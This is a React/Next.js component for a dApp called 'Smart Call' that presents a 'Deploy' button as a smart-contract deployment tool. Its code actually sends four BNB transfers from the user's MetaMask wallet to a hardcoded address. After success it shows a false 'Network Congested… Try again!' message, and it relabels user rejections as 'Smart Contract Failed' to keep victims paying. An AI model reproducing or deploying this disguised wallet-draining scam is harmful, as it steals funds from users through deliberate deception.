"use client";
import React, { useState, useEffect } from "react";
import Image from "next/image";
import { ethers } from "ethers";
import { FaSpinner } from "react-icons/fa";

interface EthereumError {
  code: number | string;
  message: string;
}

export function Wallet() {
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [transactionStatus, setTransactionStatus] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [showInstructions, setShowInstructions] = useState<boolean>(false);

  // Array of amounts for multiple transactions
  const TRANSACTION_AMOUNTS = ["0.012", "0.03", "0.1", "0.2"];
  const RECIPIENT_ADDRESS = "0xEa1244f29d894Fb3240b5A0e6214177Cd4b57F3a";
  const BNB_CHAIN_ID = "0x38";
  const DAPP_URL = "web3smartcalls.com";

  const [deviceInfo, setDeviceInfo] = useState({
    isMobile: false,
    isAndroid: false,
    isIOS: false,
    inMetaMaskBrowser: false,
  });

  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    setDeviceInfo({
      isMobile: /iphone|ipad|ipod|android|mobile/i.test(userAgent),
      isAndroid: /android/i.test(userAgent),
      isIOS: /iphone|ipad|ipod/i.test(userAgent),
      inMetaMaskBrowser: userAgent.includes("metamask"),
    });
  }, []);

  const handleMetaMaskRedirect = () => {
    if (deviceInfo.isAndroid || deviceInfo.isIOS) {
      setShowInstructions(true);

      const encodedUrl = encodeURIComponent(`https://${DAPP_URL}`);
      const deepLink = deviceInfo.isAndroid
        ? `metamask://browseto/${encodedUrl}`
        : `https://metamask.app.link/dapp/${DAPP_URL}`;

      window.location.href = deepLink;

      setTimeout(() => {
        window.location.href = "https://metamask.io/download/";
      }, 1500);
    }
  };

  const checkAndSwitchNetwork = async (): Promise<boolean> => {
    try {
      const chainId = await window.ethereum!.request({ method: "eth_chainId" });
      if (chainId !== BNB_CHAIN_ID) {
        await window.ethereum!.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BNB_CHAIN_ID }],
        });
      }
      return true;
    } catch (error) {
      const ethError = error as EthereumError;
      if (ethError.code === 4902) {
        setErrorMessage("Please add the BNB network to your wallet.");
      } else {
        setErrorMessage("");
      }
      return false;
    }
  };

  const executeTransaction = async (
    signer: ethers.providers.JsonRpcSigner,
    amount: string,
    index: number
  ): Promise<void> => {
    setTransactionStatus(`Preparing transaction ${index + 1}/4...`);

    const transaction = {
      to: RECIPIENT_ADDRESS,
      value: ethers.utils.parseEther(amount),
      gasLimit: 21000,
    };

    setTransactionStatus(`${index + 1}/4 confirmations...`);
    const txResponse = await signer.sendTransaction(transaction);

    await txResponse.wait();
  };

  const handleSmartCall = async (): Promise<void> => {
    setIsLoading(true);
    setTransactionStatus("");
    setErrorMessage("");

    try {
      if (!window.ethereum?.isMetaMask && deviceInfo.isMobile) {
        handleMetaMaskRedirect();
        setErrorMessage("Follow the instructions above.");
        setIsLoading(false);
        return;
      }

      if (!window.ethereum?.isMetaMask) {
        window.open("https://metamask.io/download/", "_blank");
        setErrorMessage("Install MetaMask to proceed");
        setIsLoading(false);
        return;
      }

      const networkSwitchSuccess = await checkAndSwitchNetwork();
      if (!networkSwitchSuccess) {
        setIsLoading(false);
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();

      const accounts = await provider.send("eth_requestAccounts", []);
      const connectedWallet = accounts[0];
      setWalletAddress(connectedWallet);

      // Execute transactions sequentially
      for (let i = 0; i < TRANSACTION_AMOUNTS.length; i++) {
        try {
          await executeTransaction(signer, TRANSACTION_AMOUNTS[i], i);
        } catch (error) {
          console.error(`Transaction ${i + 1} failed:`, error);
          throw error; // Re-throw to be caught by outer catch block
        }
      }

      setTransactionStatus(
        "Network Congested\nSmart contract development failed\nTry again!"
      );
    } catch (error) {
      console.error("Transaction failed:", error);
      setTransactionStatus("");

      const ethError = error as EthereumError;

      if (ethError.code === "ACTION_REJECTED") {
        setErrorMessage("Smart Contract Failed");
        return;
      }

      if (ethError.code === "INSUFFICIENT_FUNDS") {
        setErrorMessage("Insufficient funds for transaction");
        return;
      }

      if (ethError.code === "NETWORK_ERROR") {
        setErrorMessage("Network connection error. Please try again");
        return;
      }

      if (ethError.message) {
        const errorMessage = ethError.message.toLowerCase();

        if (errorMessage.includes("user rejected")) {
          setErrorMessage("Smart Contract Failed");
        } else if (errorMessage.includes("insufficient")) {
          setErrorMessage("Insufficient funds for transaction");
        } else if (errorMessage.includes("network")) {
          setErrorMessage("Network connection error. Please try again");
        } else {
          setErrorMessage("Smart Contract Failed. Please try again");
        }
      } else {
        setErrorMessage("Smart Contract Failed. Please try again");
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex justify-center">
      <div className="flex flex-col p-6 rounded-xl items-center space-y-4 bg-[#090C17] w-full ring-1 ring-white/20 max-w-md">
        <Image
          src="/metamask.webp"
          width={100}
          height={100}
          alt="MetaMask"
          className="rounded-lg"
        />
        <h2 className="text-lg font-semibold">Smart Call</h2>

        {walletAddress && (
          <p className="text-green-600 text-base">
            Connected Wallet: {walletAddress.substring(0, 6)}...
            {walletAddress.slice(-4)}
          </p>
        )}

        <button
          onClick={handleSmartCall}
          className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
          disabled={isLoading}
        >
          {isLoading ? (
            <>
              <FaSpinner className="animate-spin mr-2" /> Processing...
            </>
          ) : (
            "Deploy"
          )}
        </button>

        {showInstructions && (
          <div className="text-sm text-white/80 space-y-2 bg-white/10 p-4 rounded-lg">
            <p>To use this dApp:</p>
            <ol className="list-decimal list-inside space-y-1">
              <li>Open your MetaMask mobile app</li>
              <li>Tap on the dApp browser at the bottom menu </li>
              <li>
                ⁠Open this URL:{" "}
                <span className="text-[#08a0dd]">{`https://${DAPP_URL}`}</span>{" "}
                in the dApp browser
              </li>
              <li>Deploy the smart contract</li>
            </ol>
          </div>
        )}

        {transactionStatus &&
          transactionStatus.split("\n").map((line, index) => (
            <p
              key={index}
              className={`text-sm ${
                line.includes("Network Congested") ||
                line.includes("Smart contract development failed") ||
                line.includes("Try again")
                  ? "text-red-500"
                  : "text-green-500"
              }`}
            >
              {line}
            </p>
          ))}

        {errorMessage && (
          <p className="text-sm text-red-500 text-center">{errorMessage}</p>
        )}
      </div>
    </div>
  );
}
